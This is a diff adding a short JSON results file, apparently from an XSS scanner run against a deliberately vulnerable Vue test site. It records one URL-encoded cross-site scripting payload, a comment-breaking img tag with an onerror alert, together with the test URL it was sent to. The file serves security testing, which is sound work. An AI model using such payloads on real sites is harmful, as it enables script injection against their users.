@@ -1,0 +1,9 @@
+{
+    "results": [
+        {
+            "count": 1,
+            "payload": "xss=%3C%21--%3Cimg+src%3D%22--%3E%3Cimg+src%3Dx+onerror%3Dalert%28123%29%2F%2F%22%3E%0A",
+            "url": "https://vue-xss-suite-test-site.herokuapp.com/simpleComment?xss=%3C%21--%3Cimg+src%3D%22--%3E%3Cimg+src%3Dx+onerror%3Dalert%28123%29%2F%2F%22%3E%0A"
+        }
+    ]
+}
